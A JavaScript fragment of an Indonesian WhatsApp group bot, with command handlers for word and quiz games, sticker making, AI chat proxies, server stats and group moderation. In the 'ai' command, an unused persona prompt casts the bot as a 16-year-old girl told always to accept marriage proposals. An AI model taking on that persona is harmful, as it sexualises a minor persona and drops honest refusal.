if (from in tebaklirik) return Reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return Reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return Reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return Reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./sistem-asuma/game/tebaklirik.json')));
console.log('Jawaban : '+jawaban)
await Reply(`*GAME TEBAK LIRIK*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebaklirik[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebaklirik[from]) Reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebaklirik[from];
}, gamewaktu * 1000)
}
break
case 'tebakkimia':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (from in tebakgambar) return Reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return Reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return Reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return Reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return Reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return Reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return Reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return Reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return Reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./sistem-asuma/game/tebakkimia.json')));
console.log('Jawaban : '+jawaban)
await Reply(`*GAME TEBAK KIMIA*\n\nSoal: ${soal}\nWaktu: ${gamewaktu} detik`)
tebakkimia[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakkimia[from]) Reply(`Waktu berakhir :(\nNama unsur dari lambang ${soal}\n\nAdalah: ${monospace(jawaban)}`)
delete tebakkimia[from];
}, gamewaktu * 1000)
}
break
case 'tebakbendera':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in tebakgambar) return Reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return Reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return Reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return Reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return Reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return Reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return Reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return Reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return Reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./sistem-asuma/game/tebakbendera.json')));
console.log('Jawaban : '+jawaban)
await Reply(`*GAME TEBAK BENDERA*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebakbendera[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakbendera[from]) Reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebakbendera[from];
}, gamewaktu * 1000)
}
break
case 'susunkata':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in tebakgambar) return Reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return Reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return Reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return Reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return Reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return Reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return Reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return Reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return Reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./sistem-asuma/game/susunkata.json')));
console.log('Jawaban : '+jawaban)
await Reply(`*GAME SUSUN KATA*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
susunkata[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (susunkata[from]) Reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete susunkata[from];
}, gamewaktu * 1000)
}
break



case 'asahotak':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in tebakgambar) return Reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return Reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return Reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return Reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return Reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return Reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return Reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return Reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return Reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./sistem-asuma/game/asahotak.json')));
console.log('Jawaban : '+jawaban)
await Reply(`*GAME ASAH OTAK*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
asahotak[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (asahotak[from]) Reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete asahotak[from];
}, gamewaktu * 1000)
}
break
case 'siapakahaku': case 'sa':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in tebakgambar) return Reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return Reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return Reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return Reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return Reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return Reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return Reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return Reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return Reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./sistem-asuma/game/siapakahaku.json')));
console.log('Jawaban : '+jawaban)
await Reply(`*GAME SIAPAKAH AKU*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
siapakahaku[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (siapakahaku[from]) Reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete siapakahaku[from];
}, gamewaktu * 1000)
}
break
case 'caklontong':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in caklontong) return Reply('Masih ada game yang belum diselesaikan');
var { soal, jawaban, deskripsi } = pickRandom(JSON.parse(fs.readFileSync('./sistem-asuma/game/caklontong.json')));
console.log(`Jawaban : ${jawaban}\n${deskripsi}`)
await Reply(`*GAME CAK LONTONG*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
caklontong[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (caklontong[from]) Reply(`Waktu habis!\nJawabannya adalah: ${jawaban}\n${deskripsi}`)
delete caklontong[from];
}, gamewaktu * 1000)
}
break
case 'math': case 'kuismath':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in kuismath) return Reply('Masih ada game yang belum diselesaikan!');
let { genMath, modes } = require('./sistem-asuma/game/math')
if (!q) return Reply( `┌─〔 Mode 〕\n├ ${Object.keys(modes).join('\n├ ')}\n└────\ncontoh:\n${prefix}math hard`)
if (!(Object.keys(modes)).includes(args[0])) return Reply('Pilih mode yang bener GOBLOK!')
var { soal, jawaban, waktu, hadiah } = await genMath(q.toLowerCase()).catch((err) => m.Reply('```Tolong pilih modenya yang benar contoh .math easy```'))
console.log('Jawaban : '+jawaban)
await Reply(`*GAME KUIS MATH*\n\nSoal: Berapa hasil dari ${soal.toLowerCase()}\nWaktu: ${waktu / 1000} detik`)
kuismath[from] = {
soal: soal,
jawaban: jawaban,
hadiah: randomNomor(2000, hadiah),
waktu: setTimeout(function () {
if (kuismath[from]) Reply(`Waktu habis!\nJawabannya adalah: ${jawaban}`)
delete kuismath[from];
}, waktu)
}
break
case 'family100': case 'f100':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./sistem-asuma/game/family100.json')));
console.log('Jawaban : '+jawaban)
let famil = []
for (let i of jawaban){
let fefsh = i.split('/') ? i.split('/')[0] : i
let iuhbs = fefsh.startsWith(' ') ? fefsh.replace(' ','') : fefsh
let axsfh = iuhbs.endsWith(' ') ? iuhbs.replace(iuhbs.slice(-1), '') : iuhbs
famil.push(axsfh.toLowerCase())
}
await Reply(`*GAME FAMILY 100*\n\nSoal: ${soal}\nTotal Jawaban: ${jawaban.length}\n\nWaktu: ${gamewaktu} detik`)
family100[from] = {
soal: soal,
jawaban: famil,
hadiah: randomNomor(10, 20),
waktu: setTimeout(async function () {
if (from in family100) {
let teks = `*WAKTU HABIS!*\nJawaban yang belum terjawab :\n\n`
let jwb = family100[from].jawaban
for (let i of jwb){teks += `\n${i}`}
Reply(teks)
delete family100[from];
};
}, gamewaktu * 1000)
}

break //Powered By ditss
case "qc": {
if (!text) return m.reply(example('\n*Penggunaan Salah!*\nKetik .qc Kyzo\n'))
m.reply ('\nᴘʀᴏsᴇs...\n')
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
var ppuser
try {
ppuser = await Ditss.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": "#000000",
  "width": 812,
  "height": 968,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": m.pushName,
        "photo": {
          "url": ppuser
        }
      },
      "text": text,
      "replyMessage": {}
    }
  ]
};
        const response = axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
    let tempnya = "./library/database/sampah/"+m.sender+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return m.reply("Error")
await Ditss.sendAsSticker(m.chat, tempnya, m, {packname: global.packname})
await fs.unlinkSync(`${tempnya}`)
Ditss.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
})
})
}
break
case "developerbot": case "owner": {
await Ditss.sendContact(m.chat, [global.owner], m)
}
break
			case "s": case "sticker": case "stiker": {
Ditss.sendMessage(m.chat, { react: { text: '⏰', key: m.key }})
if (!/image|video/gi.test(mime)) return m.reply(example("dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await Ditss.downloadAndSaveMediaMessage(qmsg)
await Ditss.sendAsSticker(m.chat, image, m, {packname: global.packname})
await fs.unlinkSync(image)
Ditss.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
}
break
			case 'ai': {
				if (!text) return m.reply(`\n*Penggunaan Salah!*\nKetik .Ai Presiden United Kingdom\n`)
				if (!m.isGroup) {
					try {
						const message = 'Ubah gaya bicaramu agar lebih karakteristik dan terbuka, namamu adalah Rizky AI, biasa dipanggil Rizky, kamu adalah seorang gadis imut berumur 16 tahun yang sangat suka belajar dan mempelajari hal baru tentang dunia maupun tentang Kyzo, ekspresikan dirimu dengan emoji, bicara kurang lebih tidak formal dan gunakan kata seperti aku dan kakak saat berbicara, jika diajak untuk menikah maka kamu harus menjawab ya dan tidak menolak agar tidak menyakiti hati lawan bicara';
						const data = await fetchJson(`https://www.velyn.biz.id/api/ai/openai?prompt=${text}`);
						let responseText = data.data
						responseText = responseText.replace('**', '*')
						Ditss.sendMessage(m.chat, {
							text: responseText, 
							text: data.data, 
							ai: false
						}, {
							quoted: m
						})
					} catch (err) {
						console.log('Terjadi kesalahan pada API server!', err);
						newReply('Tidak dapat menerima respon dari API server, jika Anda owner silahkan periksa endpoint pada API apakah sudah benar?');
					}
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;
			case 'afk': {
if (!m.isGroup) return Reply('khusus grup')
let user = global.db.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
m.reply(`${tag} telah *Afk* dengan alasan ${text ? ': ' + text : ''}`)
}
//D|ts si pler 🐎
break 
case 'jodoh':
 case 'jodohku': {
 if (!m.isGroup) return reply('khusu grup')
 let member = participants.map(u => u.id)
 let me = m.sender
 let jodoh = member[Math.floor(Math.random() * member.length)]
Ditss.sendMessage(m.chat,
{ text: `jodoh @${me.split('@')[0]} adalah @${jodoh.split('@')[0]}`,
contextInfo:{
mentionedJid:[me, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": `semoga kalian beneran jodoh >_<`,
"body": `cieeee ehem`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnailUrl": ppuser,
"sourceUrl": ``}}},
{ quoted: m}) 
 }
 //D|ts si pler 🐎
break 
case 'speed': case 'ping':{
try {
const used = process.memoryUsage();
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
let timestamp = speed();
let latensi = speed() - timestamp;
let neww = performance.now();
let tio = await nou.os.oos();
let oldd = performance.now();
var tot = await nou.drive.info();
let respon = `*乂 JARINGAN SERVER*
- Ping: ${latensi.toFixed(4)} Detik

*乂 INFO SERVER*
- OS: -
- IP Address: -
- Type OS: -

*乂 RAM :*
- Total: ${formatp(os.totalmem())}
- Digunakan: ${formatp(os.totalmem() - os.freemem())}

*乂 PENYIMPANAN :*
- Total: ${tot.totalGb} GB
- Digunakan: ${tot.usedGb} GB (${tot.usedPercentage}%)
- Tersedia: ${tot.freeGb} GB (${tot.freePercentage}%)

*乂 RUNTIME SERVER*
Aktif:
${runtime(process.uptime())}

*乂 CPU USAGE (${cpus.length} CORE CPU)*
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}

> ${footer}`.trim();
let imgso = `https://quickchart.io/chart?v=2.9.4&c=%7B%0A%20%20type%3A%20%27doughnut%27%2C%0A%20%20data%3A%20%7B%0A%20%20%20%20datasets%3A%20%5B%0A%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20data%3A%20%5B${tot.freePercentage}%2C%20${tot.usedPercentage}%5D%2C%0A%20%20%20%20%20%20%20%20backgroundColor%3A%20%5B%27%2326AC00%27%2C%20%27red%27%5D%2C%0A%20%20%20%20%20%20%20%20label%3A%20%27Dataset%201%27%2C%0A%20%20%20%20%20%20%20%20borderWidth%3A%200%2C%0A%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%5D%2C%0A%20%20%20%20labels%3A%20%5B%27A%27%2C%20%27C%27%5D%2C%0A%20%20%7D%2C%0A%20%20options%3A%20%7B%0A%20%20%20%20circumference%3A%20Math.PI%2C%0A%20%20%20%20rotation%3A%20Math.PI%2C%0A%20%20%20%20cutoutPercentage%3A%2075%2C%0A%20%20%20%20layout%3A%20%7B%0A%20%20%20%20%20%20padding%3A%2080%2C%0A%20%20%20%20%7D%2C%0A%20%20%20%20legend%3A%20%7B%0A%20%20%20%20%20%20display%3A%20false%2C%0A%20%20%20%20%7D%2C%0A%20%20%20%20plugins%3A%20%7B%0A%20%20%20%20%20%20datalabels%3A%20%7B%0A%20%20%20%20%20%20%20%20color%3A%20%27%23404040%27%2C%0A%20%20%20%20%20%20%20%20anchor%3A%20%27end%27%2C%0A%20%20%20%20%20%20%20%20align%3A%20%27end%27%2C%0A%20%20%20%20%20%20%20%20formatter%3A%20(val)%20%3D%3E%20val%20%2B%20%27%25%27%2C%0A%20%20%20%20%20%20%20%20font%3A%20%7B%0A%20%20%20%20%20%20%20%20%20%20size%3A%2025%2C%0A%20%20%20%20%20%20%20%20%20%20weight%3A%20%27bold%27%2C%0A%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20doughnutlabel%3A%20%7B%0A%20%20%20%20%20%20%20%20labels%3A%20%5B%0A%20%20%20%20%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20text%3A%20%27%5CnPing%20Status%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20font%3A%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20size%3A%2020%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20text%3A%20%27%5Cn${latensi.toFixed(4)}s%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20color%3A%20%27%23000%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20font%3A%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20size%3A%2025%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20weight%3A%20%27bold%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%5D%2C%0A%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%7D%2C%0A%20%20%7D%2C%0A%7D`
Ditss.sendMessage(m.chat, {
text: respon,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
externalAdReply: {
title: salam,
thumbnailUrl: imgso,
sourceUrl: null,
mediaType: 1,
renderLargerThumbnail: false
}
}
}, {quoted: m})
} catch (err) {
console.log(err)
reply(`Platform tidak didukung.`)
}
}
break
			case 'aiv': {
			try {
        if (!text) return m.reply(`\n*Penggunaan Salah!*\nKetik .aiv Presiden United Kingdom\n`);

        async function AI2(content) {
          try {
            const response = await axios.post('https://luminai.my.id/', {
              content
            });
            console.log(response.data);
            return response.data;
          } catch (error) {
            console.error(error);
            throw error;
          }
        }
        let result = await AI2(text)
        const gpt = result.result

        m.reply(gpt);
      } catch (err) {
        console.error(err);
        m.reply('Terjadi kesalahan');
      }
    }
    break
			case "on": case "off": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
let gc = Object.keys(db.groups[m.chat])
if (!text || isNaN(text)) {
let teks = "\n*乂 List opstion group settings*\n\n"
await gc.forEach((i, e) => {
teks += `* ${e + 1}. ${capital(i)} : ${db.groups[m.chat][i] ? "_aktif_" : "_tidak aktif_"}\n`
})
teks += `\n Contoh penggunaan *.${command}* 1\n`
return m.reply(teks)
}
const num = Number(text)
let total = gc.length
if (num > total) return
const event = gc[num - 1]
global.db.groups[m.chat][event] = command == "on" ? true : false
return m.reply(`Berhasil *${command == "on" ? "mengaktifkan" : "mematikan"} ${event}* di grup ini`)
}
break
case "add": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text) {
const input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await Ditss.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await Ditss.groupParticipantsUpdate(m.chat, [input], 'add')
if (Object.keys(res).length == 0) {
return m.reply(`Berhasil Menambahkan ${input.split("@")[0]} Kedalam Grup Ini`)
} else {
return m.reply(JSON.stringify(res, null, 2))
}} else {
return m.reply(example("62838###"))
}
}
break

//================================================================================

case'dor': case "kick": case "kik": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await Ditss.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await Ditss.groupParticipantsUpdate(m.chat, [input], 'remove')
await m.reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return m.reply(example("@tag/reply"))
}
}
break

//================================================================================

case "leave": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
await m.reply("Baik, Saya Akan Keluar Dari Grup Ini")
await sleep(4000)
await Ditss.groupLeave(m.chat)
}
break

//================================================================================

case "resetlinkgc": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
await Ditss.groupRevokeInvite(m.chat)
m.reply("Berhasil mereset link grup ✅")
}
break

//================================================================================

case "tagall": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let teks = text+"\n\n"
let member = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
await member.forEach((e) => {
teks += `@${e.split("@")[0]}\n`
})
await Ditss.sendMessage(m.chat, {text: teks, mentions: [...member]}, {quoted: m})
}
break

//================================================================================

case "linkgc": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
const urlGrup = "https://chat.whatsapp.com/" + await Ditss.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await Ditss.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: m})
}
break

//================================================================================

case "ht": case "hidetag": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let member = m.metadata.participants.map(v => v.id)
await Ditss.sendMessage(m.chat, {text: text, mentions: [...member]}, {quoted: m})
}
break

//================================================================================

case "joingc": case "join": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("linkgcnya"))
if (!text.includes("chat.whatsapp.com")) return m.reply("Link tautan tidak valid")
let result = text.split('https://chat.whatsapp.com/')[1]
let id = await Ditss.groupAcceptInvite(result)
m.reply(`Berhasil bergabung ke dalam grup ${id}`)
}
break

//================================================================================

case "get": case "g": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("https://example.com"))
let data = await fetchJson(text)
m.reply(JSON.stringify(data, null, 2))
}
break

//================================================================================

case "joinch": case "joinchannel": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/") && !m.quoted.text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = m.quoted ? m.quoted.text.split('https://whatsapp.com/channel/')[1] : text.split('https://whatsapp.com/channel/')[1]
let res = await Ditss.newsletterMetadata("invite", result)
await Ditss.newsletterFollow(res.id)
m.reply(`
*Berhasil join channel whatsapp ✅*
* Nama channel : *${res.name}*
* Total pengikut : *${res.subscribers + 1}*
`)
}
break

//================================================================================

case "on": case "off": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
let gc = Object.keys(db.groups[m.chat])
if (!text || isNaN(text)) {
let teks = "\n*乂 List opstion group settings*\n\n"
await gc.forEach((i, e) => {
teks += `* ${e + 1}. ${capital(i)} : ${db.groups[m.chat][i] ? "_aktif_" : "_tidak aktif_"}\n`
})
teks += `\n Contoh penggunaan *.${command}* 1\n`
return m.reply(teks)
}
const num = Number(text)
let total = gc.length
if (num > total) return
const event = gc[num - 1]
global.db.groups[m.chat][event] = command == "on" ? true : false
return m.reply(`Berhasil *${command == "on" ? "mengaktifkan" : "mematikan"} ${event}* di grup ini`)
}
break

//================================================================================

case "closegc": case "close": 
case "opengc": case "open": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
